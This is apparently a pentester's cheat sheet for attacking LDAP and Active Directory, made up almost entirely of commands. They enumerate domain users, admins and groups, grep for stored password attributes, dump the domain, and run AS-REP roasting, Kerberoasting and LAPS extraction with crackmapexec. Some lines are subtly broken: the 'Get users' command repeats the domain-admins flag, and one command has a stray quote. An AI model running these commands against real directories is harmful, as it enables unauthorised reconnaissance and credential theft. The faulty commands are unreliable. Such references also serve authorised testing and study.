LDAP (Lightweight Directory Access Protocol) is a software protocol for enabling anyone to locate organizations, individuals, and other resources such as files and devices in a network, whether on the public Internet or on a corporate intranet. LDAP is a "lightweight" (smaller amount of code) version of Directory Access Protocol (DAP).

You could also use GUI explorer's `jxplorer` for easy enumeration
### Enumeration

`nmap -n -sV --script "ldap* and not brute" <IP> #Using anonymous credentials`

```
# Get computers
windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --computers
# Get groups
windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --groups
# Get users
windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Domain Admins
windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --da
# Get Privileged Users
windapsearch.py --dc-ip 10.10.10.10 -u john@domain.local -p password --privileged-users
```

**Null Creds**

`ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"`

**With Creds**

`ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"`

*If you find something saying that the "bind must be completed" means that the credentials are incorrect.*

| Description               | LDAP Search Command                                                                                                    |
|---------------------------|------------------------------------------------------------------------------------------------------------------------|
| Extract everything        | `ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"`                  |
| Extract users              | `ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"`          |
| Extract computers          | `ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"`      |
| Extract my info            | `ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=<MY NAME>,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"` |
| Extract Domain Admins      | `ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"` |
| Extract Domain Users       | `ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"` |
| Extract Enterprise Admins  | `ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"` |
| Extract Administrators     | `ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"` |
| Extract Remote Desktop Group | `ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"` |

To check if you have access to any password, use `grep` after executing one of the queries:
`<ldapsearchcmd...> | grep -i -A2 -B2 "userpas"`

#### Attacking

**Dumping**(if you have creds):

`ldapdomaindump <IP> [-r <IP>] -u '<domain>\<username>' -p '<password>' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]`


## Crackmapexec

```
crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host> --admin-count
crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host>  --asreproast ASREPROAST
crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host>  --groups
crackmapexec ldap'<IP> -u <User> -p <Password> --kdcHost <Host>  --kerberoasting KERBEROASTING
crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host>  --password-not-required
crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host>  --trusted-for-delegation
crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host>  --users

# Modules
crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host> -M get-desc-users
crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host> -M laps
crackmapexec ldap <IP> -u <User> -p <Password> --kdcHost <Host> -M ldap-signing
```
